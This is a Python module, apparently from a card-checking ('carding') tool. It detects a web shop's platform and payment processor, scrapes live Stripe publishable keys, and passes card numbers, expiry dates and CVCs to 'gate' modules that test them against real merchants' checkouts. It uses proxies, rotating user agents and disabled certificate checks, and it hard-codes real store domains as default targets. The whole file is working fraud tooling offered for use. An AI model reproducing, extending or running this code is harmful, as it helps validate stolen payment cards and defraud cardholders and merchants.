"""
Auto-Detect Gate - Automatically identifies platform and routes to appropriate gate
Supports: Shopify, WooCommerce (Stripe/Braintree/PayPal)
"""

import requests
import re
import random
from typing import Tuple, Optional
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]


def detect_platform(session: requests.Session, base_url: str) -> dict:
    """
    Detect e-commerce platform and payment processor.
    
    Returns dict with:
    - platform: 'shopify', 'woocommerce', 'magento', 'bigcommerce', 'unknown'
    - payment_processor: 'stripe', 'braintree', 'paypal', 'square', 'unknown'
    - stripe_pk: Stripe public key if found
    - details: Additional detection info
    """
    result = {
        'platform': 'unknown',
        'payment_processor': 'unknown',
        'stripe_pk': None,
        'details': {}
    }
    
    try:
        resp = session.get(base_url, timeout=10)
        html = resp.text
        headers = dict(resp.headers)
        
        if _detect_shopify(html, headers, session, base_url):
            result['platform'] = 'shopify'
            result['details']['shopify_detected'] = True
            
            pk = _extract_stripe_key(html)
            if pk:
                result['payment_processor'] = 'stripe'
                result['stripe_pk'] = pk
            elif 'checkout.com' in html.lower():
                result['payment_processor'] = 'checkout_com'
            else:
                result['payment_processor'] = 'shopify_payments'
            
            return result
        
        if _detect_woocommerce(html, headers, session, base_url):
            result['platform'] = 'woocommerce'
            result['details']['woocommerce_detected'] = True
            
            pk = _extract_stripe_key(html)
            if pk:
                result['payment_processor'] = 'stripe'
                result['stripe_pk'] = pk
            elif 'braintree' in html.lower():
                result['payment_processor'] = 'braintree'
            elif 'paypal' in html.lower():
                result['payment_processor'] = 'paypal'
            
            return result
        
        if _detect_magento(html, headers):
            result['platform'] = 'magento'
            pk = _extract_stripe_key(html)
            if pk:
                result['payment_processor'] = 'stripe'
                result['stripe_pk'] = pk
            return result
        
        if _detect_bigcommerce(html, headers):
            result['platform'] = 'bigcommerce'
            pk = _extract_stripe_key(html)
            if pk:
                result['payment_processor'] = 'stripe'
                result['stripe_pk'] = pk
            return result
        
        pk = _extract_stripe_key(html)
        if pk:
            result['payment_processor'] = 'stripe'
            result['stripe_pk'] = pk
        
    except Exception as e:
        result['details']['error'] = str(e)[:50]
    
    return result


def _detect_shopify(html: str, headers: dict, session: requests.Session, base_url: str) -> bool:
    """Detect if site is Shopify"""
    indicators = [
        'cdn.shopify.com' in html,
        'Shopify.shop' in html,
        'shopify-section' in html,
        'myshopify.com' in html,
        headers.get('x-shopify-stage', '') != '',
        headers.get('x-sorting-hat-shopid', '') != '',
    ]
    
    if any(indicators):
        return True
    
    try:
        products_resp = session.get(f"{base_url}/products.json?limit=1", timeout=5)
        if products_resp.status_code == 200:
            data = products_resp.json()
            if 'products' in data:
                return True
    except:
        pass
    
    return False


def _detect_woocommerce(html: str, headers: dict, session: requests.Session, base_url: str) -> bool:
    """Detect if site is WooCommerce"""
    indicators = [
        'woocommerce' in html.lower(),
        'wc-block' in html,
        'wp-content' in html,
        'wc_add_to_cart' in html,
        '/wp-json/wc/' in html,
        'wc-stripe' in html.lower(),
        'add_to_cart' in html,
    ]
    
    if any(indicators):
        return True
    
    try:
        wc_resp = session.get(f"{base_url}/wp-json/wc/v3/", timeout=5)
        if wc_resp.status_code in [200, 401]:
            return True
    except:
        pass
    
    try:
        checkout_resp = session.get(f"{base_url}/checkout/", timeout=5)
        if checkout_resp.status_code == 200:
            if 'woocommerce' in checkout_resp.text.lower():
                return True
    except:
        pass
    
    return False


def _detect_magento(html: str, headers: dict) -> bool:
    """Detect if site is Magento"""
    indicators = [
        'mage' in html.lower() and 'magento' in html.lower(),
        '/static/version' in html,
        'Magento' in headers.get('X-Magento-', ''),
        'requirejs-config' in html and 'mage' in html,
    ]
    return any(indicators)


def _detect_bigcommerce(html: str, headers: dict) -> bool:
    """Detect if site is BigCommerce"""
    indicators = [
        'bigcommerce' in html.lower(),
        'cdn.bigcommerce.com' in html,
        headers.get('x-bc-', '') != '',
    ]
    return any(indicators)


def _extract_stripe_key(html: str) -> Optional[str]:
    """Extract Stripe public key from HTML"""
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9_]+)"',
        r'data-publishable-key="(pk_live_[a-zA-Z0-9_]+)"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            pk = match.group(0) if 'pk_live_' in match.group(0) else match.group(1)
            if pk.startswith('pk_live_'):
                return pk
    
    return None


DEFAULT_TEST_SITES = [
    "kyliecosmetics.com",
    "colourpop.com",
    "gymshark.com",
    "ccfoundationorg.com",
]

def auto_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
               proxy=None, site_url: str = None) -> Tuple[str, bool]:
    """
    Auto-detect platform and route to appropriate gate.
    If no site_url provided, uses default Shopify store for testing.
    
    Returns: (status_message, proxy_alive)
    """
    session = requests.Session()
    session.verify = False
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    
    if proxy:
        if isinstance(proxy, dict):
            session.proxies.update(proxy)
        elif isinstance(proxy, str):
            parts = proxy.split(':')
            if len(parts) == 4:
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
            session.proxies.update({'http': proxy_url, 'https': proxy_url})
    
    if not site_url:
        from gates.shopify_checkout import shopify_checkout_check
        result, alive = shopify_checkout_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)
        return (f"{result} [Auto→Shopify]", alive)
    
    if not site_url.startswith('http'):
        site_url = f"https://{site_url}"
    
    base_url = site_url.rstrip('/')
    
    detection = detect_platform(session, base_url)
    platform = detection['platform']
    processor = detection['payment_processor']
    stripe_pk = detection['stripe_pk']
    
    parsed = urlparse(base_url)
    domain = parsed.netloc
    
    if platform == 'shopify':
        from gates.shopify_checkout import shopify_checkout_check
        result, alive = shopify_checkout_check(card_num, card_mon, card_yer, card_cvc, 
                                                shopify_url=base_url, proxy=proxy)
        return (f"{result} [Shopify]", alive)
    
    elif platform == 'woocommerce':
        if processor == 'stripe' and stripe_pk:
            from gates.woostripe import woostripe_check
            result, alive = woostripe_check(card_num, card_mon, card_yer, card_cvc,
                                            proxy=proxy, site_url=base_url)
            return (f"{result} [WooCommerce+Stripe]", alive)
        
        elif processor == 'braintree':
            try:
                from gates.braintree_auth import braintree_auth_check
                result, alive = braintree_auth_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)
                return (f"{result} [WooCommerce+Braintree]", alive)
            except ImportError:
                return ("Error: Braintree gate not available", False)
        
        elif processor == 'paypal':
            try:
                from gates.paypal_charge import paypal_charge_check
                result, alive = paypal_charge_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)
                return (f"{result} [WooCommerce+PayPal]", alive)
            except ImportError:
                return ("Error: PayPal gate not available", False)
        
        else:
            from gates.woostripe import woostripe_check
            result, alive = woostripe_check(card_num, card_mon, card_yer, card_cvc,
                                            proxy=proxy, site_url=base_url)
            return (f"{result} [WooCommerce]", alive)
    
    elif platform in ['magento', 'bigcommerce']:
        if stripe_pk:
            from gates.stripe_multi import stripe_multi_check
            result, alive = stripe_multi_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)
            return (f"{result} [{platform.title()}+Stripe]", alive)
        else:
            return (f"DECLINED - {platform.title()} detected but no supported payment processor", False)
    
    else:
        if stripe_pk:
            from gates.stripe_multi import stripe_multi_check
            result, alive = stripe_multi_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)
            return (f"{result} [Unknown+Stripe]", alive)
        else:
            return ("DECLINED - Could not detect platform or payment processor", False)


def scan_sites(sites: list, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
               proxy=None) -> list:
    """
    Scan multiple sites and categorize by platform.
    
    Returns list of dicts with site info and detection results.
    """
    results = []
    
    session = requests.Session()
    session.verify = False
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    
    if proxy:
        if isinstance(proxy, dict):
            session.proxies.update(proxy)
    
    for site in sites:
        if not site.startswith('http'):
            site = f"https://{site}"
        
        try:
            detection = detect_platform(session, site)
            results.append({
                'site': site,
                'platform': detection['platform'],
                'payment_processor': detection['payment_processor'],
                'stripe_pk': detection['stripe_pk'],
            })
        except Exception as e:
            results.append({
                'site': site,
                'platform': 'error',
                'payment_processor': 'unknown',
                'error': str(e)[:50],
            })
    
    return results


if __name__ == "__main__":
    test_sites = [
        "kyliecosmetics.com",
        "ccfoundationorg.com",
    ]
    
    for site in test_sites:
        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': USER_AGENTS[0]})
        
        detection = detect_platform(session, f"https://{site}")
        print(f"{site}: {detection['platform']} / {detection['payment_processor']}")
